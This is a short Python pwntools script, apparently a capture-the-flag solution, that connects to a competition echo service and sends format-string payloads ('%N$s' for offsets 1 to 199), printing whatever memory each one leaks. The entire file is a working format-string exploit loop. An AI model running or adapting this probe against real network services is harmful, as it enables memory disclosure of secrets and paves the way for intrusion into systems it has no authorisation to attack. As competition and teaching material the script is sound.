from pwn import *

for i in range(1, 200):
    r = remote('simple-echo.2024-bq.ctfcompetition.com', 1337)

    r.recvuntil(b'Type input to be echoed: ')
    r.sendline(f'%{i}$s'.encode())
    
    try:
        out = r.recvall(timeout = 1)
        text = out.decode(errors = 'ignore').strip()

        print(f'offset {i}: {text}', end="\n\n")
    except EOFError:
        pass

    r.close()
